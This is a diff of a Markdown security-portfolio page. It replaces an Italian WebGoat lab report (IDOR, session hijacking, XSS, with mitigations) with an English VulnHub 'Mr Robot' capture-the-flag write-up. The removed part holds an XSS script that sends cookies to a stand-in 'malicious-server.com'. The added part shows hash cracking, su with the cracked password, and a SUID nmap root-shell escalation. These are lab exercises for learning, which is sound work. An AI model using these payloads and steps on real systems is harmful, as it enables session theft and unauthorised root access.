@@ -1,108 +1,58 @@
-# WebGoat - Report
+# Attacking Mr Robot - VulnHub
 
 ## 1. Introduzione
+This write-up details the steps I took to solve the MR Robot vulnerable machine from VulnHub. The VM is inspired by the popular TV show "Mr. Robot" and contains three flags, each of increasing difficulty. The primary goal is to capture all three flags while demonstrating common hacking techniques such as brute-force attacks, hash cracking, and privilege escalation.
 
-**Obiettivo della demo:**  
-Questa relazione descrive le attività svolte utilizzando WebGoat, una piattaforma di insegnamento delle vulnerabilità di sicurezza web. L'obiettivo è dimostrare alcune tecniche di attacco comuni e analizzare le difese contro di esse.
+The demonstration was carried out individually, following several walkthroughs and guides found online (referenced at the end of this report).
 
-**Strumenti utilizzati:**
-- WebGoat (versione X.X.X)
-- Burp Suite Community Edition
-- Docker (per eseguire WebGoat)
-- Browser (ad es. Firefox o Chrome)
+**Threat Model:**  
+In this scenario, the threat model assumes that the attacker is on the same local network as the MR Robot virtual machine.
 
 ## Configurazione dell'Ambiente
 
 **Passaggi per la configurazione dell'ambiente:**
-**Installazione di Docker e WebGoat:**
-   ```bash
-   docker pull webgoat/webgoat
-   docker run -p 8080:8080 webgoat/webgoat
-   ```
-L'applicazione WebGoat è stata eseguita su http://localhost:8081/WebGoat.
+**Tools:**
+- Mr-Robot: 1 (Relese Date: 28 Jun 2016)
+- VirtualBox
+- Kali Linux Virtual Machine
 
-**Configurazione di Burp Suite come proxy:**
-Burp Suite configurato per intercettare il traffico su 127.0.0.1:8080.
-Browser configurato per utilizzare Burp come proxy.
-## Dimostrazione degli Attacchi
-### IDOR (Insecure Direct Object Reference)
-#### Descrizione dell'attacco:
-L'attacco IDOR si verifica quando un'applicazione espone riferimenti a oggetti interni (es. record del database) senza controlli di accesso appropriati.
+## Privilege Escalation
+Capturing the Second Flag
+Upon exploring the machine, I found two interesting files in the /home/robot directory:
 
-Passaggi:
+key-2-of-3.txt: The second flag (unreadable by my current user).
+password.raw-md5: An MD5-hashed password for the user robot.
 
-Intercettato e modificato l'URL per accedere a un profilo non autorizzato:
-  ```bash  /WebGoat/IDOR/profile/2342388
-  ```
-  
-Utilizzato Burp Suite per intercettare la richiesta HTTP e modificare l'ID del profilo per accedere a un profilo di un altro utente.
-Confermato l'accesso non autorizzato modificando i dettagli del profilo.
-3.2. Session Hijacking
-Descrizione dell'attacco:
-Il Session Hijacking si verifica quando un attaccante ruba o si impossessa della sessione di un altro utente, solitamente attraverso cookie non sicuri.
+I used John the Ripper to crack the hash:
+```john --format=raw-md5 password.raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt```
 
-Passaggi:
+John the Ripper Output:
+```password: abcdefghijklmnopqrstuvwxyz```
 
-Intercettato il cookie di sessione usando Burp Suite.
-Utilizzato il cookie rubato per autenticarsi come l'utente vittima in una nuova sessione.
-Dimostrato il controllo completo della sessione dell'utente.
-3.3. XSS (Cross-Site Scripting)
-Descrizione dell'attacco:
-XSS consente a un attaccante di inserire codice JavaScript malevolo in una pagina web visualizzata da altri utenti.
+I switched to the user robot using the cracked password:
+``` su robot
+    Password: abcdefghijklmnopqrstuvwxyz
+```
+Once logged in as robot, I retrieved the second flag:
 
-Passaggi:
-
-Identificato un campo di input vulnerabile in WebGoat.
-Iniettato il seguente codice XSS per catturare i cookie degli utenti:
-html
+bash
 Copia codice
-<script>
-  var i = new Image();
-  i.src = "http://malicious-server.com/steal?cookie=" + document.cookie;
-</script>
-Confermato il furto di cookie dalla vittima.
-4. Difese e Mitigazioni
-4.1. Protezione contro IDOR
-Implementare controlli di accesso rigorosi lato server per ogni oggetto richiesto.
-Utilizzare identificatori non prevedibili o UUID per le risorse sensibili.
-4.2. Protezione contro Session Hijacking
-Impostare il flag HttpOnly sui cookie di sessione per prevenire accessi da JavaScript.
-Utilizzare la crittografia HTTPS per proteggere i cookie in transito.
-4.3. Protezione contro XSS
-Utilizzare correttamente l'escaping delle variabili nelle pagine HTML.
-Abilitare il Content Security Policy (CSP) per limitare l'esecuzione di script non autorizzati.
-5. Conclusioni
-Durante questa demo, sono stati simulati diversi attacchi comuni alle applicazioni web utilizzando WebGoat. Ogni vulnerabilità è stata dimostrata con successo e sono state proposte contromisure adeguate. Questo tipo di simulazioni evidenzia l'importanza di implementare buone pratiche di sicurezza nello sviluppo di applicazioni web.
+```cat /home/robot/key-2-of-3.txt```
 
-6. Riferimenti
-WebGoat Documentation
-Burp Suite Documentation
-OWASP Top 10
+### Root Privilege Escalation
+To escalate privileges to root, I searched for SUID binaries, which allow files to be executed with elevated privileges:
+```find / -perm -u=s -type f 2>/dev/null```
 
+Among the results, I found Nmap with the SUID bit set. The version of Nmap installed on the system supported interactive mode, which allows commands to be executed as root.
 
+```nmap --interactive
+!sh
+```
 
-# WebGoat - Walkthrough
-
-## Introduzione
-
-**Obiettivo:**  
-L'obiettivo di questo report è 
-
-**Strumenti utilizzati:**
-- WebGoat (versione )
-- Burp Suite Community Edition
-- Docker (per eseguire WebGoat)
-- Browser - Chrome
-
-## Configurazione dell'Ambiente
-
-**Passaggi per la configurazione dell'ambiente:**
-1. **Installazione di Docker e WebGoat:**
-   ```bash
-   docker pull webgoat/webgoat
-   docker run -p 8080:8080 webgoat/webgoat
-
-
+I spawned a root shell and captured the final flag:
+```
+cat /root/key-3-of-3.txt
+```
 (images/cyber-security.jpg)
 
 [Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
